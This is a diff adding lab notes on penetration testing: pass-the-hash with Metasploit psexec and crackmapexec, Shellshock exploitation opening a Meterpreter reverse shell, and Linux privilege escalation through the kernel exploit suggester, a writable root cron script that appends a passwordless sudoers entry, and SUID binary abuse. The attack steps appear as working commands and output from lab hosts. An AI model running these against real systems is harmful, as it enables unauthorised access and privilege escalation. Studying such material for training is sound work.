@@ -2448,7 +2448,11 @@ the server is configured well and not display any cleartext password
 
 #### Pass-The-Hash Attacks    
 
-**perform Pass-The-Hash attack with psexec metasploit module**
+Pass-the-hash is an exploitation technique that involves capturing or harvesting NTLM hashes or clear-text passwords and utilizing them to authenticate with the target legitimately.
+
+This technique will allow us to obtain access to the target system via legitimate credentials as opposed to obtaining access via service exploitation.
+
+**1- perform Pass-The-Hash attack with psexec metasploit module**
 
 we need LM hash and NTLM hash also
 
@@ -2463,6 +2467,100 @@ WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:58f8e0214224aebc2c5f82fb
 
 user:SID:LMhash:NTLMhash
 ```
+
+
+
+use the LM hash and NTLM hash as a password
+
+```cmd
+meterpreter > getuid 
+Server username: NT AUTHORITY\SYSTEM
+
+meterpreter > 
+Background session 1? [y/N]  
+msf6 exploit(windows/http/badblue_passthru) > search psexec
+
+msf6 > use exploit(windows/smb/psexec
+msf6 exploit(windows/smb/psexec) > setg RHOSTS 10.4.27.152
+RHOSTS => 10.4.27.152
+msf6 exploit(windows/smb/psexec) > set LPORT 4222
+LPORT => 4222
+msf6 exploit(windows/smb/psexec) > set SMBUSER Administrator
+SMBUSER => Administrator
+msf6 exploit(windows/smb/psexec) > set SMBPASS aad3b435b51404eeaad3b435b51404ee:e3c61a68f1b89ee6c8ba9507378dc88d
+SMBPASS => aad3b435b51404eeaad3b435b51404ee:e3c61a68f1b89ee6c8ba9507378dc88d
+msf6 exploit(windows/smb/psexec) > show targets 
+
+Exploit targets:
+
+   Id  Name
+   --  ----
+   0   Automatic
+   1   PowerShell
+   2   Native upload
+   3   MOF upload
+   4   Command
+
+
+msf6 exploit(windows/smb/psexec) > set target Native\ upload 
+target => Native upload
+msf6 exploit(windows/smb/psexec) > exploit 
+
+[*] Started reverse TCP handler on 10.10.23.5:4222 
+[*] 10.4.27.152:445 - Connecting to the server...
+[*] 10.4.27.152:445 - Authenticating to 10.4.27.152:445 as user 'Administrator'...
+[!] 10.4.27.152:445 - peer_native_os is only available with SMB1 (current version: SMB3)
+[*] 10.4.27.152:445 - Uploading payload... kCirjrlU.exe
+[*] 10.4.27.152:445 - Created \kCirjrlU.exe...
+[+] 10.4.27.152:445 - Service started successfully...
+[*] Sending stage (175174 bytes) to 10.4.27.152
+[*] 10.4.27.152:445 - Deleting \kCirjrlU.exe...
+[*] Meterpreter session 3 opened (10.10.23.5:4222 -> 10.4.27.152:50396) at 2024-01-26 19:00:32 +0530
+
+meterpreter > 
+
+```
+
+
+
+**2- perform Pass-The-Hash attack with crackmapexec**
+
+we need the user and his NTLM hash
+
+```bash
+ root@attackdefense:~# crackmapexec smb 10.4.27.152 -u Administrator -H "e3c61a68f1b89ee6c8ba9507378dc88d" 
+[*] First time use detected
+[*] Creating home directory structure
+[*] Creating default workspace
+[*] Initializing LDAP protocol database
+[*] Initializing SMB protocol database
+[*] Initializing MSSQL protocol database
+[*] Initializing WINRM protocol database
+[*] Initializing SSH protocol database
+[*] Copying default configuration file
+[*] Generating SSL certificate
+SMB  10.4.27.152     445    ATTACKDEFENSE    [*] Windows 10.0 Build 17763 x64 (name:ATTACKDEFENSE) (domain:AttackDefense) (signing:False) (SMBv1:False)
+SMB  10.4.27.152     445    ATTACKDEFENSE    [+] AttackDefense\Administrator e3c61a68f1b89ee6c8ba9507378dc88d (Pwn3d!) <<<====
+
+
+root@attackdefense:~# crackmapexec smb 10.4.27.152 -u Administrator -H "e3c61a68f1b89ee6c8ba9507378dc88d" -x "ipconfig"
+SMB         10.4.27.152     445    ATTACKDEFENSE    [*] Windows 10.0 Build 17763 x64 (name:ATTACKDEFENSE) (domain:AttackDefense) (signing:False) (SMBv1:False)
+SMB         10.4.27.152     445    ATTACKDEFENSE    [+] AttackDefense\Administrator e3c61a68f1b89ee6c8ba9507378dc88d (Pwn3d!)
+SMB         10.4.27.152     445    ATTACKDEFENSE    [+] Executed command 
+SMB         10.4.27.152     445    ATTACKDEFENSE    Windows IP Configuration
+SMB         10.4.27.152     445    ATTACKDEFENSE    
+SMB         10.4.27.152     445    ATTACKDEFENSE    
+SMB         10.4.27.152     445    ATTACKDEFENSE    Ethernet adapter Ethernet 3:
+SMB         10.4.27.152     445    ATTACKDEFENSE    
+SMB         10.4.27.152     445    ATTACKDEFENSE    Connection-specific DNS Suffix  . : ec2.internal
+SMB         10.4.27.152     445    ATTACKDEFENSE    Link-local IPv6 Address . . . . . : fe80::a4c2:575f:50d4:9a4b%8
+SMB         10.4.27.152     445    ATTACKDEFENSE    IPv4 Address. . . . . . . . . . . : 10.4.27.152
+SMB         10.4.27.152     445    ATTACKDEFENSE    Subnet Mask . . . . . . . . . . . : 255.255.240.0
+SMB         10.4.27.152     445    ATTACKDEFENSE    Default Gateway . . . . . . . . . : 10.4.16.1
+
+```
+
+
 
 
 
@@ -2484,6 +2582,322 @@ user:SID:LMhash:NTLMhash
 
 
 
+#### CVE-2014-6271 - Shellshock
+
+- Shellshock (CVE-2014-6271) is the name given to a family of vulnerabilities in the Bash shell (since V1.3) that allow an attacker to execute remote arbitrary commands via Bash, consequently allowing the attacker to obtain remote access to the target system via a reverse shell.
+- Bash is a *Nix shell that is part of the GNU project and is the default shell for most Linux distributions.
+- The Shellshock vulnerability is caused by a vulnerability in Bash, whereby Bash mistakenly executes trailing commands after a series of characters: () {:;};.
+- This vulnerability only affects Linux as Windows does not use utilize Bash as it is not a *Nix based operating system.
+- In the context of remote exploitation, Apache web servers configured to run CGI scripts or .sh scripts are also vulnerable to this attack.
+- CGI (Common Gateway Interface) scripts are used by Apache to execute arbitrary commands on the Linux system, after which the output is displayed to the client
+
+
+
+**Shellshock Exploitation**
+
+- In order to exploit this vulnerability, you will need to locate an input vector or script that allows you to communicate with Bash.
+- In the context of an Apache web server, we can utilize any legitimate CGI scripts accessible on the web server.
+- Whenever a CGI script is executed, the web server will initiate a new process and run the CGI script with Bash.
+- This vulnerability can be exploited both manually and automatically with the use of an MSF exploit module.
+
+
+
+**detect shellshock with nmap script `http-shellshock` **
+
+/gettime.cgi is a file that the website was used to get time
+
+```bash
+root@attackdefense:~# nmap 192.12.3.3 -p80  -sV --script=http-shellshock.nse --script-args uri=/gettime.cgi
+Starting Nmap 7.70 ( https://nmap.org ) at 2024-01-26 20:01 IST
+Nmap scan report for target-1 (192.12.3.3)
+Host is up (0.000041s latency).
+
+PORT   STATE SERVICE VERSION
+80/tcp open  http    Apache httpd 2.4.6 ((Unix))
+|_http-server-header: Apache/2.4.6 (Unix)
+| http-shellshock: 
+|   VULNERABLE:
+|   HTTP Shellshock vulnerability
+|     State: VULNERABLE (Exploitable)
+|     IDs:  CVE:CVE-2014-6271
+|       This web application might be affected by the vulnerability known as Shellshock. It seems the server
+|       is executing commands injected via malicious HTTP headers.
+
+```
+
+
+
+
+
+<img src="./assets/11.png" style="zoom:100%;" />
+
+
+
+**exploit shellshock using metasploit `/multi/http/apache_mod_cgi_bash_env_exec`**
+
+```bash
+msf5 > use exploit/multi/http/apache_mod_cgi_bash_env_exec
+msf5 exploit(multi/http/apache_mod_cgi_bash_env_exec) > options
+
+Module options (exploit/multi/http/apache_mod_cgi_bash_env_exec):
+
+   Name            Current Setting  Required  Description
+   ----            ---------------  --------  -----------
+   CMD_MAX_LENGTH  2048             yes       CMD max line length
+   CVE             CVE-2014-6271    yes       CVE to check/exploit (Accepted: CVE-2014-6271, CVE-2014-6278)
+   HEADER          User-Agent       yes       HTTP header to use
+   METHOD          GET              yes       HTTP method to use
+   Proxies                          no        A proxy chain of format type:host:port[,type:host:port][...]
+   RHOSTS                           yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
+   RPATH           /bin             yes       Target PATH for binaries used by the CmdStager
+   RPORT           80               yes       The target port (TCP)
+   SRVHOST         0.0.0.0          yes       The local host to listen on. This must be an address on the local machine or 0.0.0.0
+   SRVPORT         8080             yes       The local port to listen on.
+   SSL             false            no        Negotiate SSL/TLS for outgoing connections
+   SSLCert                          no        Path to a custom SSL certificate (default is randomly generated)
+   TARGETURI                        yes       Path to CGI script
+   TIMEOUT         5                yes       HTTP read response timeout (seconds)
+   URIPATH                          no        The URI to use for this exploit (default is random)
+   VHOST                            no        HTTP server virtual host
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Linux x86
+
+
+msf5 exploit(multi/http/apache_mod_cgi_bash_env_exec) > set RHOSTS 192.12.3.3
+RHOSTS => 192.12.3.3
+msf5 exploit(multi/http/apache_mod_cgi_bash_env_exec) > set targeturi /gettime.cgi 
+targeturi => /gettime.cgi
+msf5 exploit(multi/http/apache_mod_cgi_bash_env_exec) > run
+
+[*] Started reverse TCP handler on 192.12.3.2:4444 
+[*] Command Stager progress - 100.46% done (1097/1092 bytes)
+[*] Sending stage (985320 bytes) to 192.12.3.3
+[*] Meterpreter session 1 opened (192.12.3.2:4444 -> 192.12.3.3:36426) at 2024-01-26 20:10:40 +0530
+
+meterpreter > pwd
+/opt/apache/htdocs
+meterpreter > sysinfo
+Computer     : 192.12.3.3
+OS           : Ubuntu 14.04 (Linux 5.4.0-152-generic)
+Architecture : x64
+BuildTuple   : i486-linux-musl
+Meterpreter  : x86/linux
+
+```
+
+
+
+---
+
+### Linux Privilege Escalation
+
+#### Linux Kernel Exploits    
+
+- Kernel exploits on Linux will typically target vulnerabilities In the Linux kernel to execute arbitrary code in order to run privileged system commands
+  or to obtain a system shell.
+- This process will differ based on the Kernel version and distribution being targeted and the kernel exploit being used.
+- Privilege escalation on Linux systems will typically follow the following methodology:
+  - Identifying kernel vulnerabilities
+  - Downloading, compiling and transferring kernel exploits onto the target system
+- **Linux-Exploit-Suggester** - This tool is designed to assist in detecting security deficiencies for given Linux kernel/Linux-based machine. It assesses (using heuristics methods) the exposure of the given kernel on every publicly known Linux kernel exploit.
+  + GitHub: https://github.com/mzet-/linux-exploit-suggester
+
+**exploitation steps**
+
+1 - download the script on your machine
+
+```bash
+wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh -O les.sh
+```
+
+
+
+2- upload it to the victime machine with metasploit or any another method
+
+```bash
+meterpreter > upload Desktop/lse.sh
+```
+
+
+
+3- run the script
+
+```bash
+meterpreter > shell
+www-data@victim:~$ chmod +x lse.sh
+www-data@victim:~$ ./lse.sh
+```
+
+the script will recommend a list of exploits that we can execute to perform privilege escalation
+
+
+
+----
+
+#### Cron Jobs
+
+- Linux implements task scheduling through a utility called Cron.
+- Cron is a time-based service that runs applications, scripts and other commands repeatedly on a specified schedule.
+- An application, or script that has been configured to be run repeatedly with Cron is known as a Cron job. Cron can be used to automate or repeat a wide variety of functions on a system, from daily backups to system upgrades and patches.
+- The crontab file is a configuration file that is used by the Cron utility to store and track Cron jobs that have been created.
+
+
+
+
+
+#### Exploiting Misconfigured Cron Jobs    
+
+- Cron jobs can also be run as any user on the system, this is a very important factor to keep an eye on as we will be targeting Cron jobs that have been configured to be run as the “root” user.
+- This is primarily because, any script or command that is run by a Cron job will run as the root user and will consequently provide us with root access.
+- In order to elevate our privileges, we will need to find and identify cron jobs scheduled by the root user or the files being processed by the cron job.
+
+
+
+**view list of cronjobs for specific user**
+
+```bash
+student@attackdefense:~$ crontab -l
+no crontab for student
+```
+
+
+
+**search for shell script that use specific file**
+
+```bash
+student@attackdefense:~$ grep -rnw / -e "/home/student/message" 2> /dev/null
+/usr/local/share/copy.sh:2:cp /home/student/message /tmp/message
+
+student@attackdefense:~$ ls -la /usr/local/share/copy.sh
+-rwxrwxrwx 1 root root 74 Sep 23  2018 /usr/local/share/copy.sh
+```
+
+any one can read, wite and execute this file and the owner of this file is the root
+
+
+
+put student user in the sudoers file
+
+```bash
+student@attackdefense:~$ printf '#!/bin/bash\necho "student ALL=NOPASSWD:ALL" >> /etc/sudoers' > /usr/local/share/copy.sh
+```
+
+
+
+after 1 minute (the cronjob execution)
+
+```bash
+student@attackdefense:~$ sudo su
+/bin/bash -i
+root@attackdefense:~#
+root@attackdefense:~#
+root@attackdefense:~# id
+id
+uid=0(root) gid=0(root) groups=0(root)
+root@attackdefense:~#
+root@attackdefense:~# crontab -l
+crontab -l
+*/01 * * * * sh /usr/local/share/copy.sh *
+
+
+root@attackdefense:~# cat /etc/sudoers
+cat /etc/sudoers
+# User privilege specification
+root    ALL=(ALL:ALL) ALL
+
+# Members of the admin group may gain root privileges
+%admin ALL=(ALL) ALL
+
+# Allow members of group sudo to execute any command
+%sudo   ALL=(ALL:ALL) ALL
+
+# See sudoers(5) for more information on "#include" directives:
+
+#includedir /etc/sudoers.d
+student ALL=NOPASSWD: /etc/init.d/cron
+student ALL=NOPASSWD:ALL
+```
+
+
+
+---
+
+#### Exploiting SUID Binaries    
+
+- In addition to the three main file access permissions (read, write and execute), Linux also provides users with specialized permissions that can be utilized in specific situations. One of these access permissions is the SUID (Set Owner User ID) permission.
+- When applied, this permission provides users with the ability to execute a script or binary with the permissions of the file owner as opposed to the user that is running the script or binary.
+- SUID permissions are typically used to provide unprivileged users with the ability to run specific scripts or binaries with “root” permissions. It is to be noted, however, that the provision of elevate privileges is limited to the execution of the script and does not translate to elevation of privileges, however, if improperly configured unprivileged users can exploit misconfigurations or vulnerabilities within the binary or script to obtain an elevated session
+- This is the functionality that we will be attempting to exploit in order to elevate our privileges, however, the success of our attack will depend on the following factors:
+  - Owner of the SUID binary – Given that we are attempting to elevate our privileges, we will only be exploiting SUID binaries that are owned by the “root” user or other privileged users.
+  - Access permissions – We will require executable permissions in order to execute the SUID binary
+
+
+
+
+
+```bash
+student@attackdefense:~$ ls -la
+total 36
+drwxr-xr-x 1 student student 4096 Sep 22  2018 .
+drwxr-xr-x 1 root    root    4096 Sep 22  2018 ..
+-rw-r--r-- 1 root    root      88 Sep 22  2018 .bashrc
+-r-x------ 1 root    root    8296 Sep 22  2018 greetings
+-rwsr-xr-x 1 root    root    8344 Sep 22  2018 welcome
+student@attackdefense:~$ ./welcome
+Welcome to Attack Defense Labs
+```
+
+Observe that the welcome binary has suid bit set (or on). This means that this binary and its child processes will run with root privileges.
+
+
+
+overwrite the greetings file with `/bin/bash` and execute `welcome` file.  welcome executes greeting with root privileges, so we got a shell with root privileges
+
+```bash
+student@attackdefense:~$ cp /bin/bash greetings
+student@attackdefense:~$ ls
+greetings  greetings.old  welcome
+student@attackdefense:~$ ls -la
+total 1132
+drwxr-xr-x 1 student student    4096 Jan 26 18:02 .
+drwxr-xr-x 1 root    root       4096 Sep 22  2018 ..
+-rw-r--r-- 1 root    root         88 Sep 22  2018 .bashrc
+-rwxr-xr-x 1 student student 1113504 Jan 26 18:04 greetings
+-rwsr-xr-x 1 root    root       8344 Sep 22  2018 welcome
+student@attackdefense:~$ ./welcome
+root@attackdefense:~# id
+uid=0(root) gid=999(student) groups=999(student)
+root@attackdefense:~# whoami
+root
+```
+
+
+
+
+
+
+
+
+
+---
+
+### Linux Credential Dumping
+
+#### Dumping Linux Password Hashes    
+
+
+
+
+
+
+
+
+
 
 
 
@@ -2492,3 +2906,4 @@ user:SID:LMhash:NTLMhash
 
 - https://tbhaxor.com/exploit-webdav-using-metasploit/
 - https://learn.microsoft.com/en-us/windows-hardware/manufacture/desktop/update-windows-settings-and-scripts-create-your-own-answer-file-sxs?view=windows-11
+- https://owasp.org/www-pdf-archive/Shellshock_-_Tudor_Enache.pdf
